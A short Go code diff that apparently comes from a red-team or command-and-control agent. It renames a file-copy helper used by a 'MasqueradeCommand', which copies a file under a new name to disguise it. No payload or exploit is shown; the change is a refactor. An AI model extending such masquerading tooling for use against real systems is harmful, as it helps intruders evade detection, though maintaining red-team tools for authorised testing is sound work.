@@ -68,7 +68,7 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Copy with new name
-	if err := copyFile(args.Source, destPath); err != nil {
+	if err := masqueradeCopyFile(args.Source, destPath); err != nil {
 		return errorf("Error copying file: %v", err)
 	}
 
@@ -169,7 +169,7 @@ func reverseString(s string) string {
 	return string(runes)
 }
 
-func copyFile(src, dst string) error {
+func masqueradeCopyFile(src, dst string) error {
 	srcFile, err := os.Open(src)
 	if err != nil {
 		return err
